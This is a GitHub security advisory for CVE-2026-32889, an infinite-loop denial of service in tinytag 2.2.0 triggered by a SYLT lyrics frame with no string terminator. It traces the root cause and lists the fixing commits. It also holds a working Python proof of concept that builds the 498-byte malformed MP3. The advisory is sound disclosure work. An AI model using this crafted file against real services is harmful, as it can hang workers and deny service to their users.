# [M] Denial of service via non-terminating SYLT frame parsing loop in tinytag

## Summary
Severity: Medium
Advisory: GHSA-f4rq-2259-hv29
CVE: CVE-2026-32889
CWE: CWE-835
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-f4rq-2259-hv29
Type: github-advisory

## Affected
- PyPI: `tinytag` — affected >=0 <2.2.1

## Details
### Summary

`tinytag` `2.2.0` allows an attacker who can supply MP3 files for parsing to trigger a non-terminating loop while the library parses an ID3v2 `SYLT` (synchronized lyrics) frame. In server-side deployments that automatically parse attacker-supplied files, a single `498`-byte MP3 can cause the parsing operation to stop making progress and remain busy until the worker or process is terminated.

### Details

In tag `2.2.0` (`6f1d3060f393743c2ec34d07c0855cceed827244`), the reachable call path is:

- `TinyTag.get` in [`tinytag/tinytag.py#L144-L154`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L144-L154)
- `_load` in [`tinytag/tinytag.py#L259-L266`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L259-L266)
- `_parse_tag` and `_parse_id3v2` in [`tinytag/tinytag.py#L1059-L1092`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1059-L1092)
- `_parse_frame` for `SYLT` / `SLT` in [`tinytag/tinytag.py#L1316-L1318`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1316-L1318)
- `_parse_synced_lyrics` and `_find_string_end_pos` in [`tinytag/tinytag.py#L1219-L1248`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1219-L1248) and [`tinytag/tinytag.py#L1340-L1352`](https://github.com/tinytag/tinytag/blob/6f1d3060f393743c2ec34d07c0855cceed827244/tinytag/tinytag.py#L1340-L1352)

The root cause is that `_parse_synced_lyrics` assumes `_find_string_end_pos` always returns a position greater than the current `offset`. That assumption is false when no string terminator is present in the remaining frame content.

For single-byte encodings, `_find_string_end_pos` does:

```python
return content.find(b'\x00', start_pos) + 1
```

If no terminator exists, `content.find(...)` returns `-1`, so the function returns `0`. `_parse_synced_lyrics` then does `offset = end_pos`, which resets `offset` to `0` inside:

```python
while offset < content_length:
    end_pos = self._find_string_end_pos(content, encoding, offset)
    value = self._decode_string(encoding + content[offset:end_pos]).lstrip('\n')
    offset = end_pos
    time = unpack('>I', content[offset:offset + 4])[0]
```

Because `offset` is reset to `0`, the loop condition remains true and the parser stops making forward progress. The UTF-16 branch in `_find_string_end_pos` has the same shape: if no `b'\x00\x00'` terminator is found, it also returns `0`, so the same non-progress condition applies there.

`SYLT` parsing support was introduced by commit [`4d649b9c314ada8ff8a74e0469e9aadb3acb252a`](https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a) (`ID3: Make synced lyrics available in 'other.lyrics' (LRC format) (#270)`), which first shipped in `2.2.0`. I confirmed that `2.1.2` does not contain `_parse_synced_lyrics`, so `2.2.0` is the only confirmed affected release at this time.

Test environment:

- MacBook Air (Apple M2), macOS `26.3` / Darwin `arm64`
- Python `3.14.3`
- Confirmed affected release: `tinytag 2.2.0` (`6f1d3060f393743c2ec34d07c0855cceed827244`)
- Also reproduced on current `main` commit `1d23f6fe169c92c070a265f9108e295577141383`

### PoC

The following self-contained PoC generates a malformed `SYLT` frame and passes it to `TinyTag.get`:

```python
#!/usr/bin/env python3
import signal
import struct
import time
from io import BytesIO

from tinytag import TinyTag


def create_malicious_mp3() -> bytes:
    id3_header = b"ID3" + bytes([3, 0, 0])  # ID3v2.3
    encoding = b"\x00"  # ISO-8859-1
    language = b"eng"
    timestamp_format = b"\x02"
    content_type = b"\x01"
    descriptor = b"test\x00"
    lyrics_data = b"A" * 50  # no null terminator in the remaining SYLT payload
    frame_content = (
        encoding + language + timestamp_format + content_type + descriptor + lyrics_data
    )
    frame = b"SYLT" + struct.pack(">I", len(frame_content)) + b"\x00\x00" + frame_content

    tag_size = len(frame)
    synchsafe = bytearray(4)
    n = tag_size
    for i in range(3, -1, -1):
        synchsafe[i] = n & 0x7F
        n >>= 7

    return (
        id3_header
        + bytes(synchsafe)
        + frame
        + b"\xff\xfb\x90\x00"
        + b"\x00" * 413
    )


def timeout_handler(signum, frame) -> None:
    print("CONFIRMED: parsing did not finish within 10.0s; external interruption was required")
    raise SystemExit(1)


signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(10)
start = time.time()

try:
    TinyTag.get(file_obj=BytesIO(create_malicious_mp3()), filename="poc.mp3")
    signal.alarm(0)
    print(f"Unexpectedly completed in {time.time() - start:.3f}s")
except SystemExit:
    raise
except Exception as exc:
    signal.alarm(0)
    print(f"Unexpected exception before timeout: {type(exc).__name__}: {exc}")
```

Observed output on `2.2.0` in the environment above:

```text
CONFIRMED: parsing did not finish within 10.0s; external interruption was required
```

### Impact

An attacker who can supply MP3 files for parsing can cause tinytag to enter a non-terminating loop in its own parser. This is a library-level availability issue in the documented parsing path.

In server-side processing of attacker-supplied files, a single request can tie up a worker or process that performs metadata extraction. In local or desktop integrations, opening a malicious file can hang the parsing task until it is interrupted.

### Patches

Fixed in the following commits:

- https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402
- https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a

## References
- https://github.com/tinytag/tinytag/security/advisories/GHSA-f4rq-2259-hv29
- https://nvd.nist.gov/vuln/detail/CVE-2026-32889
- https://github.com/tinytag/tinytag/commit/44e496310f7ced8077e9087e3774acbaa324b18a
- https://github.com/tinytag/tinytag/commit/4d649b9c314ada8ff8a74e0469e9aadb3acb252a
- https://github.com/tinytag/tinytag/commit/5cd321521ff097e41724b601d7e3d7adc7e53402
- https://github.com/tinytag/tinytag
